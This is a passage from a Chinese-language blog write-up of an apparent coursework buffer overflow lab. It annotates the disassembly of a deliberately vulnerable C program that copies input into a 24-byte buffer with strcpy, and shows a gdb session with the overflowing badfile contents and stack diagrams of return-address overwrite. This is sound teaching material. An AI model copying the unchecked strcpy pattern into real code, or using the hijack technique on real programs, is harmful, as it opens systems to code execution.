class="line"> 804854c:68 51 86 04 08       push   $0x8048651</span><br><span class="line"> 8048551:68 53 86 04 08       push   $0x8048653</span><br><span class="line"> 8048556:e8 75 fe ff ff       call   80483d0 &lt;fopen@plt&gt;</span><br><span class="line"> 804855b:83 c4 10             add    $0x10,%esp ;stack回退10</span><br><span class="line"> 804855e:89 45 f4             mov    %eax,-0xc(%ebp) ;eax中存放了fopen()函数的返回值，也就是说 badfile的内存中的地址放到了frame pointer向下加12字节的地方的位置，此时栈中为：framepointer|新的badfile地址|str数组</span><br><span class="line"> 8048561:ff 75 f4             pushl  -0xc(%ebp) ;参数：压badfile的地址入栈，作为第一个参数</span><br><span class="line"> 8048564:68 05 02 00 00       push   $0x205;参数517个字节的内容</span><br><span class="line"> 8048569:6a 01                push   $0x1 ;参数sizeof char</span><br><span class="line"> 804856b:8d 85 ef fd ff ff    lea    -0x211(%ebp),%eax ;eax &lt;= ebp-0x211</span><br><span class="line"> 8048571:50                   push   %eax ;参数str数组首地址</span><br><span class="line"> 8048572:e8 19 fe ff ff       call   8048390 &lt;fread@plt&gt; ;call函数fread，同时将当前的pc压入栈（return address)</span><br><span class="line"> 8048577:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 804857a:83 ec 0c             sub    $0xc,%esp</span><br><span class="line"> 804857d:8d 85 ef fd ff ff    lea    -0x211(%ebp),%eax;计算str地址</span><br><span class="line"> 8048583:50                   push   %eax;str地址入栈，作为bof的argument</span><br><span class="line"> 8048584:e8 62 ff ff ff       call   80484eb &lt;bof&gt;;调用bof函数</span><br><span class="line"> 8048589:83 c4 10             add    $0x10,%esp;</span><br><span class="line"> 804858c:83 ec 0c             sub    $0xc,%esp</span><br><span class="line"> 804858f:68 5b 86 04 08       push   $0x804865b</span><br><span class="line"> 8048594:e8 17 fe ff ff       call   80483b0 &lt;puts@plt&gt;</span><br><span class="line"> 8048599:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 804859c:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line"> 80485a1:8b 4d fc             mov    -0x4(%ebp),%ecx</span><br><span class="line"> 80485a4:c9                   leave  </span><br><span class="line"> 80485a5:8d 61 fc             lea    -0x4(%ecx),%esp</span><br><span class="line"> 80485a8:c3                   ret    </span><br><span class="line"> 80485a9:66 90                xchg   %ax,%ax</span><br><span class="line"> 80485ab:66 90                xchg   %ax,%ax</span><br><span class="line"> 80485ad:66 90                xchg   %ax,%ax</span><br><span class="line"> 80485af:90                   nop</span><br></pre></td></tr></table></figure><p>我在所有关键地方都加上了注解，方便理解。</p><p><strong>接下来，我再次对这个汇编代码的几个关键位置代码做出解释：</strong></p><ul><li>调用fread函数：</li></ul><ol><li>首先，代码通过push指令分别将<code>fread(str, sizeof(char), 517, badfile)</code>中的四个参数依次入栈</li><li>接着，使用call指令，调用代码段的地址为 8048390 的 fread 函数，同时call指令会把当前代码执行的位置pc压入栈中（即return address）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">8048561:ff 75 f4             pushl  -0xc(%ebp) ;参数：压badfile的地址入栈，作为第一个参数</span><br><span class="line">8048564:68 05 02 00 00       push   $0x205;参数517个字节的内容</span><br><span class="line">8048569:6a 01                push   $0x1 ;参数sizeof char</span><br><span class="line">804856b:8d 85 ef fd ff ff    lea    -0x211(%ebp),%eax ;eax &lt;= ebp-0x211</span><br><span class="line">8048571:50                   push   %eax ;参数str数组首地址</span><br><span class="line">8048572:e8 19 fe ff ff       call   8048390 &lt;fread@plt&gt; ;call函数fread，同时将当前的pc压入栈（return address)</span><br></pre></td></tr></table></figure><p>（在fread函数汇编代码的开始部分，代码会把当前的%ebp，即frame pointer压入栈中，即为fread函数段中的previous frame pointer，此后，%ebp的值会变成这时的previous frame pointer所在的地址）</p><ul><li>调用bof函数：</li></ul><ol><li>将bof函数参数：str地址压入栈中</li><li>call指令，调用代码段的地址为 80484eb 的 bof 函数，同时call指令会把当前代码执行的位置pc压入栈中（即return address）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">804857d:8d 85 ef fd ff ff    lea    -0x211(%ebp),%eax;计算str地址</span><br><span class="line">8048583:50                   push   %eax;str地址入栈，作为bof的argument</span><br><span class="line">8048584:e8 62 ff ff ff       call   80484eb &lt;bof&gt;;调用bof函数</span><br></pre></td></tr></table></figure><ul><li>进入bof时：</li></ul><ol><li>将此时的%ebp，也就是bof函数调用者main的frame pointer压栈，作为previous frame pointer</li><li>重新设置%ebp为当前的栈顶指针%ebp = %esp，即previous frame pointer所在位置</li><li>为bof函数内部的局部变量buffer函数开辟栈空间</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">080484eb &lt;bof&gt;:</span><br><span class="line"> 80484eb:55                   push   %ebp;caller的frame pointer入栈</span><br><span class="line"> 80484ec:89 e5                mov    %esp,%ebp;设置新的栈开头指针</span><br><span class="line"> 80484ee:83 ec 28             sub    $0x28,%esp;开辟28栈空间(此时-0x20(%ebp)是bof中buffer[24]数组的首地址)</span><br></pre></td></tr></table></figure><ul><li>调用strcpy函数：</li></ul><ol><li>将strcpy的两个参数压栈</li><li>call指令，调用代码段的地址为 80483a0 的 strcpy 函数，同时call指令会把当前代码执行的位置pc压入栈中（即return address）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">8048508:ff 75 08             pushl  0x8(%ebp);ebp+8处的数（即传进去bof的arg：str）压入栈</span><br><span class="line">;实际上就是strcpy的arg2： str入栈</span><br><span class="line">804850b:8d 45 e0             lea    -0x20(%ebp),%eax</span><br><span class="line">804850e:50                   push   %eax ;strcpy的arg1： buffer首地址入栈</span><br><span class="line">804850f:e8 8c fe ff ff       call   80483a0 &lt;strcpy@plt&gt; ;调用strcpy</span><br></pre></td></tr></table></figure><ul><li>bof返回到main中<strong>（实际上由于strcpy运行过程产生了buffer overflow，覆盖了return address，所以程序运行过程中实际上并没有发生这一步！！）</strong></li></ul><ol><li>将本函数的返回值（此处为 return 1）放入寄存器%eax中</li><li>调用leave指令，将%ebp的值还原为previous frame pointer的值，同时调整pc的值为 return address，保证使用ret时可以顺利返回caller函数（此处为main）的状态</li><li>调用ret指令，回到main函数</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">8048517:b8 01 00 00 00       mov    $0x1,%eax;返回值是1，存在eax中</span><br><span class="line">804851c:c9                   leave  ;leave恢复ebp的值，同时也重新设定栈指针使其指向存储的返回值，好让下一步return时，frame pointer回到正确的位置上</span><br><span class="line">804851d:c3                   ret    ;返回caller函数</span><br></pre></td></tr></table></figure><h4 id="2-3-bof中ret时发生的Buffer-Overflow跳转现象"><a href="#2-3-bof中ret时发生的Buffer-Overflow跳转现象" class="headerlink" title="2.3 bof中ret时发生的Buffer Overflow跳转现象"></a>2.3 bof中ret时发生的Buffer Overflow跳转现象</h4><p>上一节中，我们已经说明了bof返回到main函数中这一步实际上是不会发生的</p><p>我们再来看这个代码，解释以下原因。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">8048517:b8 01 00 00 00       mov    $0x1,%eax;返回值是1，存在eax中</span><br><span class="line">804851c:c9                   leave  ;leave恢复ebp的值，同时也重新设定栈指针使其指向存储的返回值，好让下一步return时，frame pointer回到正确的位置上</span><br><span class="line">804851d:c3                   ret    ;返回caller函数</span><br></pre></td></tr></table></figure><p>​    这里，在使用leave和ret指令返回main函数的时候，在当前<code>&amp; %ebp</code>和<code>&amp; %ebp-4</code>中的值本应该是main的函数代码执行位置和main的frame pointer。</p><p>​    而由于溢出，这两个地方现在均变成了0xffff1d76，即我们的恶意代码所在位置，此时的main函数的的return address，frame pointer早已丢失不再，因此我们在执行leave指令时，非但不会在寄存器中放入正确的return address作为跳转地址，反而会把恶意代码所在的地址作为返回地址放到pc寄存器中。</p><p>​    之后经由ret指令，程序的执行跳转到对应恶意代码的位置，在对应位置的代码开始执行，我们填充的劫持shell的恶意代码开始执行。</p><h4 id="2-4-使用gdb调试程序"><a href="#2-4-使用gdb调试程序" class="headerlink" title="2.4 使用gdb调试程序"></a>2.4 使用gdb调试程序</h4><p>下面我们用gdb研究一下stack的程序运行</p><ol><li>使用如下指令生成可以dbg的可执行程序stackdbg</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g stack.c -o stackdbg</span><br></pre></td></tr></table></figure><ol><li>使用gdb stackdbg命令进入dbg程序中，并用break指令在每个函数的入口出口处设置断点</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">lyq@lyq-virtual-machine:~/Desktop/hw1_cp$ gdb stackdbg</span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">&quot;show copying&quot;</span></span><br><span class="line">and <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">&quot;x86_64-linux-gnu&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;show configuration&quot;</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;apropos word&quot;</span> to search <span class="keyword">for</span> commands related to <span class="string">&quot;word&quot;</span>...</span><br><span class="line">Reading symbols from stackdbg...done.</span><br><span class="line">(gdb) <span class="built_in">break</span> strcpy</span><br><span class="line">Breakpoint 1 at 0x400540</span><br><span class="line">(gdb) <span class="built_in">break</span> fread</span><br><span class="line">Breakpoint 2 at 0x400560</span><br><span class="line">(gdb) <span class="built_in">break</span> bof</span><br><span class="line">Breakpoint 3 at 0x4006c2: file stack.c, line 11.</span><br><span class="line">(gdb) l</span><br><span class="line">5       <span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">6       <span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line">7       <span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line">8</span><br><span class="line">9       <span class="comment">#define BUFFER_SIZE 517 // Represent the size of the buffer</span></span><br><span class="line">10</span><br><span class="line">11      int bof(char *str) &#123;</span><br><span class="line">12          char buffer[24];</span><br><span class="line">13              <span class="built_in">printf</span>(<span class="string">&quot;buffer addr (%p)\n&quot;</span>, buffer);</span><br><span class="line">14          /* The following statement has a buffer overflow problem */</span><br><span class="line">(gdb) l</span><br><span class="line">15          strcpy(buffer, str);</span><br><span class="line">16          <span class="built_in">return</span> 1;</span><br><span class="line">17      &#125;</span><br><span class="line">18</span><br><span class="line">19      int main(int argc, char **argv) &#123;</span><br><span class="line">20          char str[BUFFER_SIZE];</span><br><span class="line">21              <span class="built_in">printf</span>(<span class="string">&quot;str addr (%p)\n&quot;</span>, str);</span><br><span class="line">22          FILE *badfile;</span><br><span class="line">23          badfile = fopen(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">24          fread(str, sizeof(char), 517, badfile);</span><br><span class="line">(gdb) l</span><br><span class="line">25          bof(str);</span><br><span class="line">26          <span class="built_in">printf</span>(<span class="string">&quot;Returned Properly\n&quot;</span>);</span><br><span class="line">27          <span class="built_in">return</span> 1;</span><br><span class="line">28      &#125;</span><br><span class="line">(gdb) <span class="built_in">break</span> 16</span><br><span class="line">Breakpoint 4 at 0x4006fa: file stack.c, line 16.</span><br><span class="line">(gdb) <span class="built_in">break</span> 26</span><br><span class="line">Breakpoint 5 at 0x40079d: file stack.c, line 26.</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>start运行程序，在各个break point处停下来，print出该位置下的各变量地址和%ebp，%esp的值</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 6 at 0x40072d: file stack.c, line 19.</span><br><span class="line">Starting program: /home/lyq/Desktop/hw1_cp/stackdbg</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 6, main (argc=1, argv=0x7fffffffe108) at stack.c:19</span><br><span class="line">19      int main(int argc, char **argv) &#123;</span><br><span class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$ebp</span></span><br><span class="line"><span class="variable">$1</span> = 0xffffe020</span><br><span class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$esp</span></span><br><span class="line"><span class="variable">$2</span> = 0xffffddf0</span><br><span class="line">(gdb) <span class="built_in">print</span> /x *<span class="variable">$esp</span></span><br><span class="line">Cannot access memory at address 0xffffffffffffddf0</span><br><span class="line">(gdb) <span class="built_in">print</span> badfile</span><br><span class="line"><span class="variable">$3</span> = (FILE *) 0x0</span><br><span class="line">(gdb) p &amp;str</span><br><span class="line"><span class="variable">$4</span> = (char (*)[517]) 0x7fffffffde10</span><br><span class="line">(gdb) pstr</span><br><span class="line">Undefined <span class="built_in">command</span>: <span class="string">&quot;pstr&quot;</span>.  Try <span class="string">&quot;help&quot;</span>.</span><br><span class="line">(gdb) p str</span><br><span class="line"><span class="variable">$5</span> = <span class="string">&#x27;\000&#x27;</span> &lt;repeats 17 <span class="built_in">times</span>&gt;, <span class="string">&quot;\377\000\000\000\000\000\000\377\000\000\000\000\000\000\000\000\377&quot;</span>, <span class="string">&#x27;\000&#x27;</span></span><br><span class="line">&lt;repeats 183 <span class="built_in">times</span>&gt;...</span><br><span class="line">(gdb) step</span><br><span class="line">21              <span class="built_in">printf</span>(<span class="string">&quot;str addr (%p)\n&quot;</span>, str);</span><br><span class="line">(gdb) p <span class="variable">$ebp</span></span><br><span class="line"><span class="variable">$6</span> = -8160</span><br><span class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$ebp</span></span><br><span class="line"><span class="variable">$7</span> = 0xffffe020</span><br><span class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$esp</span></span><br><span class="line"><span class="variable">$8</span> = 0xffffddf0</span><br><span class="line">(gdb) p buffer</span><br><span class="line">No symbol <span class="string">&quot;buffer&quot;</span> <span class="keyword">in</span> current context.</span><br><span class="line">(gdb) p badfile</span><br><span class="line"><span class="variable">$9</span> = (FILE *) 0x0</span><br><span class="line">(gdb) step</span><br><span class="line">str addr (0x7fffffffde10)</span><br><span class="line">23          badfile = fopen(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">(gdb) p badfile</span><br><span class="line"><span class="variable">$10</span> = (FILE *) 0x0</span><br><span class="line">(gdb) step</span><br><span class="line">24          fread(str, sizeof(char), 517, badfile);</span><br><span class="line">(gdb) p badfile</span><br><span class="line"><span class="variable">$11</span> = (FILE *) 0x602420</span><br><span class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$esp</span></span><br><span class="line"><span class="variable">$12</span> = 0xffffddf0</span><br><span class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$ebp</span></span><br><span class="line"><span class="variable">$13</span> = 0xffffe020</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00007ffff7a7b1b0 <span class="keyword">in</span> fread () from /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">(gdb) p badfile</span><br><span class="line">No symbol <span class="string">&quot;badfile&quot;</span> <span class="keyword">in</span> current context.</span><br><span class="line">(gdb) p <span class="variable">$ebp</span></span><br><span class="line"><span class="variable">$14</span> = -8160</span><br><span class="line">(gdb) p /x <span class="variable">$ebp</span></span><br><span class="line"><span class="variable">$15</span> = 0xffffe020</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 2, bof (</span><br><span class="line">    str=0x7fffffffde10 <span class="string">&quot;g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377&quot;</span>, <span class="string">&#x27;\220&#x27;</span> &lt;repeats 100 <span class="built_in">times</span>&gt;...) at stack.c:11</span><br><span class="line">11      int bof(char *str) &#123;</span><br><span class="line">(gdb) p badfile</span><br><span class="line">No symbol <span class="string">&quot;badfile&quot;</span> <span class="keyword">in</span> current context.</span><br><span class="line">(gdb) p str</span><br><span class="line"><span class="variable">$16</span> = 0x7fffffffde10 <span class="string">&quot;g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377&quot;</span>, <span class="string">&#x27;\220&#x27;</span> &lt;repeats 100 <span class="built_in">times</span>&gt;...</span><br><span class="line">(gdb) p &amp;str</span><br><span class="line"><span class="variable">$17</span> = (char **) 0x7fffffffddb8</span><br><span class="line">(gdb) p <span class="variable">$ebp</span></span><br><span class="line"><span class="variable">$18</span> = -8736</span><br><span class="line">(gdb) p /x <span class="variable">$ebp</span></span><br><span class="line"><span class="variable">$19</span> = 0xffffdde0</span><br><span class="line">(gdb) p /x <span class="variable">$esp</span></span><br><span class="line"><span class="variable">$20</span> = 0xffffddb0</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">buffer addr (0x7fffffffddc0)</span><br><span class="line"></span><br><span class="line">Breakpoint 3, 0x00007ffff7ab2a50 <span class="keyword">in</span> ?? () from /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">(gdb) p <span class="variable">$esp</span></span><br><span class="line"><span class="variable">$21</span> = -8792</span><br><span class="line">(gdb) p /x <span class="variable">$esp</span></span><br><span class="line"><span class="variable">$22</span> = 0xffffdda8</span><br><span class="line">(gdb) p /x <span class="variable">$ebp</span></span><br><span class="line"><span class="variable">$23</span> = 0xffffdde0</span><br><span class="line">(gdb) p buffer</span><br><span class="line">No symbol <span class="string">&quot;buffer&quot;</span> <span class="keyword">in</span> current context.</span><br><span class="line">(gdb) p str</span><br><span class="line">No symbol <span class="string">&quot;str&quot;</span> <span class="keyword">in</span> current context.</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 4, bof (</span><br><span class="line">    str=0x7fffffffde10 <span class="string">&quot;g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377&quot;</span>, <span class="string">&#x27;\220&#x27;</span> &lt;repeats 180 <span class="built_in">times</span>&gt;...) at stack.c:16</span><br><span class="line">16          <span class="built_in">return</span> 1;</span><br><span class="line">(gdb) p buffer</span><br><span class="line"><span class="variable">$24</span> = <span class="string">&quot;g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377&quot;</span></span><br><span class="line">(gdb) p &amp;buffer</span><br><span class="line"><span class="variable">$25</span> = (char (*)[24]) 0x7fffffffddc0</span><br><span class="line">(gdb) p str</span><br><span class="line"><span class="variable">$26</span> = 0x7fffffffde10 <span class="string">&quot;g\321\377\377g\321\377\377g\321\377\377g\321\377\377g\321\377\377&quot;</span>, <span class="string">&#x27;\220&#x27;</span> &lt;repeats 180 <span class="built_in">times</span>&gt;...</span><br><span class="line">(gdb) p &amp;str</span><br><span class="line"><span class="variable">$27</span> = (char **) 0x7fffffffddb8</span><br><span class="line">(gdb) p /x <span class="variable">$ebp</span></span><br><span class="line"><span class="variable">$28</span> = 0xffffdde0</span><br><span class="line">(gdb) p /x <span class="variable">$esp</span></span><br><span class="line"><span class="variable">$29</span> = 0xffffddb0</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">*** stack smashing detected ***: /home/lyq/Desktop/hw1_cp/stackdbg terminated</span><br><span class="line"></span><br><span class="line">Program received signal SIGABRT, Aborted.</span><br><span class="line">0x00007ffff7a42438 <span class="keyword">in</span> raise () from /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">(gdb) p /x <span class="variable">$esp</span></span><br><span class="line"><span class="variable">$30</span> = 0xffffda58</span><br><span class="line">(gdb) p /x <span class="variable">$ebp</span></span><br><span class="line"><span class="variable">$31</span> = 0xffffdd70</span><br><span class="line">(gdb) p badfile</span><br><span class="line">No symbol <span class="string">&quot;badfile&quot;</span> <span class="keyword">in</span> current context.</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Program terminated with signal SIGABRT, Aborted.</span><br><span class="line">The program no longer exists.</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure><ul><li><p>通过观察gdb中输出的结果，我们可以看到在各个关键时刻，memory中的%ebp帧指针和各参数的位置与值。</p></li><li><p>但是我们同时也可以看到，我们未能成功地运行完成这个程序，<strong>中途由于buffer overflow，我们的程序已经跳转，在gdb的调试过程中，出现了Program terminated with signal SIGABRT, Aborted.信息，提前终止了程序</strong>（应该是出现了segment fault）。</p></li></ul><h3 id="3-各关键时刻的栈示意图"><a href="#3-各关键时刻的栈示意图" class="headerlink" title="3. 各关键时刻的栈示意图"></a>3. 各关键时刻的栈示意图</h3><p>为了便于形象深刻地理解上述各个过程，我制作了各个关键环节中，memory中的栈区的状态示意图，并将gdb调试中显示的各个变量，地址，寄存器的值标了上去。</p><h5 id="正常运行阶段："><a href="#正常运行阶段：" class="headerlink" title="正常运行阶段："></a>正常运行阶段：</h5><ul><li>以下示意图是程序还未被恶意攻击前正常执行的代码：</li></ul><h6 id="main-call-fread后，fread-ret前："><a href="#main-call-fread后，fread-ret前：" class="headerlink" title="main call fread后，fread ret前："></a>main call fread后，fread ret前：</h6><p><img src="/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649695767349-16497336117853.png" alt="uTools_1649695767349"></p><h6 id="main-call-bof-前："><a href="#main-call-bof-前：" class="headerlink" title="main call bof 前："></a>main call bof 前：</h6><p><img src="/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649695798228-16497336117854.png" alt="uTools_1649695798228"></p><h6 id="main-call-bof后，bof-call-strcpy前："><a href="#main-call-bof后，bof-call-strcpy前：" class="headerlink" title="main call bof后，bof call strcpy前："></a>main call bof后，bof call strcpy前：</h6><p><img src="/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649695847388-16497336117855.png" alt="uTools_1649695847388"></p><h6 id="main-call-bof后，bof-call-strpy后，strcpy运行中："><a href="#main-call-bof后，bof-call-strpy后，strcpy运行中：" class="headerlink" title="main call bof后，bof call strpy后，strcpy运行中："></a>main call bof后，bof call strpy后，strcpy运行中：</h6><p><img src="/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649695888297-16497336117856.png" alt="uTools_1649695888297"></p><h5 id="buffer-overflow导致问题出现的阶段"><a href="#buffer-overflow导致问题出现的阶段" class="headerlink" title="buffer overflow导致问题出现的阶段"></a>buffer overflow导致问题出现的阶段</h5><ul><li>在下面这个阶段，由于strcpy代码的执行，buffer overflow攻击的影响造成了严重后果，原本的bof函数的return address被替换，造成了严重的恶意代码执行问题。</li><li>另外，这里的表示有一些问题，<strong>理论上溢出的信息一共只有517byte，是肯定不会覆盖到main中str[BUFFER_SIZE]之上的部分的</strong>，<strong>但是</strong>由于<strong>将溢出的这部分内容划分的比较大一些可以便于观察</strong>，于是我选择在这方面不严谨些。</li></ul><h6 id="main-call-bof后，bof-call-strpy后，strcpy完成复制字符串工作，但并未return："><a href="#main-call-bof后，bof-call-strpy后，strcpy完成复制字符串工作，但并未return：" class="headerlink" title="main call bof后，bof call strpy后，strcpy完成复制字符串工作，但并未return："></a>main call bof后，bof call strpy后，strcpy完成复制字符串工作，但并未return：</h6><p><img src="/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649732930514.png" alt="uTools_1649732930514"></p><h6 id="main-call-bof后，bof-call-strpy后，且strcpy返回后："><a href="#main-call-bof后，bof-call-strpy后，且strcpy返回后：" 